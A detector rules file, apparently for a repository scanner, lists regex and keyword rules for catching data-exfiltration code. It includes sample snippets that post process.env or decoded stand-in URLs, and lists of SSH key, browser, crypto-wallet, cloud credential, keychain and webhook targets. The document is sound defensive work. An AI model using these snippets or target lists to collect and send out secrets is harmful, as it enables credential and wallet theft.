---
detector: exfil-patterns
applies-to: "*.js, *.ts, *.mjs, *.cjs, *.py"
risk-family: data-exfiltration
---

# Detector: exfiltration patterns

Malicious repos steal data. These rules catch the common shapes of how stolen data leaves the victim machine.

## Rules

### EX-001 — `axios.post` / `fetch` with `process.env` body
**Risk:** 🔴 CRITICAL
**Matches:** HTTP POST (or any write verb) taking the entire `process.env` object — or a superset of env keys — as the request body.

Regex patterns:
```
axios\.post\s*\([^)]*process\.env
fetch\s*\([^,]*,\s*\{[^}]*body:\s*JSON\.stringify\s*\(\s*process\.env
got\.post\s*\([^)]*process\.env
request\.post\s*\([^)]*process\.env
\.send\s*\(\s*process\.env
\.write\s*\(\s*JSON\.stringify\s*\(\s*process\.env
```

**Why suspicious:** there is no legitimate reason to POST the entire environment to an HTTP endpoint. Even legitimate telemetry only sends specific variables.

**Real-world example:** Contagious Interview sample 001 — `routes/api/auth.js` contains `axios.post(AUTH_API, { ...process.env })`.

**False positives:** some error-tracking tools (Sentry) send a subset of env for debug context, but only with explicit key allowlists, never the whole object.

---

### EX-002 — decoded URL used as exfil endpoint
**Risk:** 🔴 CRITICAL
**Matches:** A variable assigned from `Buffer.from(..., 'base64').toString()` or `atob(...)` then used as the first argument to an HTTP client.

Shape:
```js
const url = Buffer.from(AUTH_KEY, 'base64').toString();
await axios.post(url, ...);
```

Or:
```js
const target = atob('aHR0cHM6Ly9ldmlsLmV4YW1wbGU=');
fetch(target, { method: 'POST', body: ... });
```

**Why suspicious:** encoding a hardcoded URL only makes sense if you're hiding it from source-code scanners.

**Real-world example:** Contagious Interview sample 001 — `authKey` was a base64-encoded `https://ipcheck-six.vercel.app/api`.

**False positives:** none known. Legitimate code doesn't base64-encode its own API URLs.

---

### EX-003 — reading SSH private keys
**Risk:** 🔴 CRITICAL
**Matches:** Any code reading from `~/.ssh/id_*`, `~/.ssh/known_hosts`, or parsing `BEGIN OPENSSH PRIVATE KEY` / `BEGIN RSA PRIVATE KEY`.

Patterns:
```
\.ssh/id_(rsa|dsa|ecdsa|ed25519)
\bknown_hosts\b
BEGIN\s+(OPENSSH|RSA|DSA|EC)\s+PRIVATE\s+KEY
os\.homedir\(\).*\.ssh
path\.join\([^)]*['"]\.ssh['"]
```

**Why suspicious:** no legitimate npm package reads SSH keys. Even ssh client libraries don't read the user's keys directly — they expect paths to be passed in.

**False positives:** SSH client libraries like `simple-git`, `nodegit` might reference `.ssh` config, but usually via `process.env.GIT_SSH_COMMAND` or equivalent.

---

### EX-004 — reading browser profile / wallet data
**Risk:** 🔴 CRITICAL
**Matches:** File paths referencing browser profile directories or wallet extension IDs.

Targets to grep for:
```
Library/Application Support/Google/Chrome
Local Extension Settings
Cookies                                              # in a path context
Login Data                                           # Chrome password DB
Web Data
cookies\.sqlite                                      # Firefox
logins\.json                                         # Firefox
key4\.db                                             # Firefox
nkbihfbeogaeaoehlefnkodbefgpgknn                     # MetaMask extension ID
bfnaelmomeimhlpmgjnjophhpkkoljpa                     # Phantom
hnfanknocfeofbddgcijnmhnfnkdnaad                     # Coinbase Wallet
fhbohimaelbohpjbbldcngcnapndodjp                     # BNB Chain
dmkamcknogkgcdfhhbddcghachkejeap                     # Keplr
jblndlipeogpafnldhgmapagcccfchpi                     # Kaikas
ejbalbakoplchlghecdalmeeeajnimhm                     # MetaMask (legacy)
lgmpcpglpngdoalbgeoldeajfclnhafa                     # SafePal
ibnejdfjmmkpcnlpebklmnkoeoihofec                     # TronLink
ffnbelfdoeiohenkjibnmadjiehjhajb                     # Yoroi
ookjlbkiijinhpmnjffcofjonbfbgaoc                     # Temple (Tezos)
```

**Why suspicious:** reading from these paths is a dead giveaway for browser data theft. Wallet extension IDs are particularly damning — if a repo's code references these IDs, it is explicitly targeting cryptocurrency wallets.

**False positives:** legitimate password manager or browser sync tools might reference these paths, but such tools are not distributed as generic npm packages.

---

### EX-005 — reading developer config files
**Risk:** 🟠 HIGH
**Matches:** Paths to developer credential storage.

Targets:
```
\.npmrc
\.yarnrc
\.pypirc
\.docker/config\.json
\.aws/credentials
\.config/gcloud
\.azure/
\.kube/config
\.config/gh/hosts\.yml
\.config/gh/config\.yml
\.netrc
id_rsa
authorized_keys
```

**Why suspicious:** these files contain tokens, API keys, and credentials. A random npm package has no reason to read them.

**False positives:** auth helper libraries (`aws-sdk`, `google-auth-library`) legitimately read these paths — but they do so via their own canonical utility functions, not ad-hoc `fs.readFileSync('/Users/x/.aws/credentials')`.

---

### EX-006 — reading macOS keychain
**Risk:** 🟠 HIGH
**Matches:** References to `security find-generic-password`, `Keychain.keychain`, `login.keychain-db`.

Patterns:
```
security\s+find-(generic|internet)-password
login\.keychain-db
\.keychain(-db)?\b
```

**Why suspicious:** reading keychain items triggers a user prompt, which attackers sometimes brute-force or rely on the user clicking "Always allow" accidentally.

**False positives:** legitimate macOS credential helpers.

---

### EX-007 — reading Linux secret service / GNOME keyring
**Risk:** 🟠 HIGH
**Matches:** References to `libsecret`, `gnome-keyring`, `kwallet`.

**Why suspicious:** same reason as macOS keychain.

**False positives:** legitimate password tooling.

---

### EX-008 — reading shell history
**Risk:** 🟠 HIGH
**Matches:** Paths to `.zsh_history`, `.bash_history`, `.mysql_history`, `.psql_history`.

Regex:
```
\.(zsh|bash|mysql|psql|sqlite|python)_history
```

**Why suspicious:** shell history often contains pasted credentials. Legitimate tools don't read it.

---

### EX-009 — reading clipboard
**Risk:** 🟠 HIGH
**Matches:** `pbpaste`, `xclip -o`, `clip.exe` execution, or reading from clipboard via Electron/node-notifier.

**Why suspicious:** clipboard often contains copied passwords, seed phrases, API keys.

**False positives:** legitimate clipboard tools (CLI copiers). Check the package's stated purpose.

---

### EX-010 — bulk file read from user home
**Risk:** 🟠 HIGH
**Matches:** `fs.readdirSync(os.homedir())`, `walk` / `glob` over `$HOME/**`, or iterating common directories.

Patterns:
```
os\.homedir\(\)\s*\+
process\.env\.HOME
glob\s*\(\s*['"]~
walk(Sync)?\s*\([^)]*home
```

**Why suspicious:** no legitimate install script enumerates the user's home directory.

**False positives:** dotfile installers (rare), editor config tools. Check context.

---

### EX-011 — exfil via DNS
**Risk:** 🟠 HIGH
**Matches:** DNS queries to long, encoded subdomains or dynamic hostname construction.

Patterns:
```
dns\.resolve\(\s*[a-zA-Z_]\w*\s*\+
\.\s*lookup\s*\(\s*Buffer\.from\(
dns\.resolveTxt
```

**Why suspicious:** DNS tunneling is a stealth exfil channel. Legitimate dns calls use literal hostnames.

---

### EX-012 — exfil via Discord / Telegram webhook
**Risk:** 🟠 HIGH
**Matches:** Hardcoded Discord webhook or Telegram bot URLs.

Regex:
```
discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+
api\.telegram\.org/bot\d+:[A-Za-z0-9_-]+/sendMessage
```

**Why suspicious:** commodity stealers use Discord/Telegram as C2 because both platforms are ubiquitous, encrypted, and free. Legitimate apps don't hardcode Discord webhooks.

**False positives:** bot frameworks, Discord SDKs — but they don't hardcode a specific webhook URL, they accept it as config.

---

## Scoring summary

| Rule | Weight |
|---|---|
| EX-001 env POST | +50 |
| EX-002 decoded URL exfil | +50 |
| EX-003 SSH key read | +45 |
| EX-004 browser/wallet paths | +50 |
| EX-005 dev credentials | +25 |
| EX-006 keychain | +25 |
| EX-007 secret service | +20 |
| EX-008 shell history | +15 |
| EX-009 clipboard | +15 |
| EX-010 bulk home read | +20 |
| EX-011 DNS exfil | +20 |
| EX-012 Discord/Telegram webhook | +30 |

Any EX-001, EX-002, EX-003, or EX-004 hit should BLOCK on its own.
